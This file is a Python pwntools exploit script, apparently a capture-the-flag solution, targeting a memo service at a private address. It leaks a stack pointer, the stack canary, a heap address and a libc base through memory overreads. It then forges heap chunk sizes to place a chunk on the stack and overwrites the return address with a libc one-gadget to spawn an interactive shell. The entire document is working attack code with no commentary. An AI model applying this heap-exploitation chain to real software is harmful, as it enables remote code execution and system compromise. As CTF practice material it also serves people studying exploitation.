#!/usr/bin/python3
from pwn import *

shell = remote("10.13.37.10", 7777)

def create_memo(data, answer, one_more_data=None):
    shell.sendlineafter(b"> ", b"1")
    shell.sendlineafter(b"Data: ", data)
    if answer[:3] == "yes":
        shell.sendafter(b"[yes/no] ", answer.encode())
    else:
        shell.sendafter(b"[yes/no] ", answer)
        shell.sendafter(b"Data: ", one_more_data)

def show_memo():
    shell.sendlineafter(b"> ", b"2")
    shell.recvuntil(b"Data: ")

def delete_memo():
    shell.sendlineafter(b"> ", b"3")

def tap_out(answer):
    shell.sendlineafter(b"> ", b"4")
    shell.sendafter(b"[yes/no] ", answer)

create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
show_memo()
shell.recv(0x20)

stack_chunk = u64(shell.recv(6) + b"\x00" * 2) - (0x7ffee7b7d4d0 - 0x7ffee7b7d3c0)

delete_memo()
create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
show_memo()
shell.recvuntil(b"A" * 0x28)
shell.recv(1)

canary = u64(b"\x00" + shell.recv(7))

create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
show_memo()
shell.recvuntil(b"A" * 0x18)
shell.recv(1)

heap = u64(b"\x00" + shell.recv(3) + b"\x00" * 4)

create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
delete_memo()
tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
delete_memo()
show_memo()

leak = u64(shell.recv(6) + b"\x00" * 2)
libc = leak - (0x7fbae5f32b78 - 0x7fbae5b6e000)

create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(stack_chunk))
create_memo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
create_memo(b"A" * 0x8 + p64(0x21) + p64(stack_chunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes")
create_memo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))

tap_out(b"yes\x00")

shell.recvline()
shell.interactive()
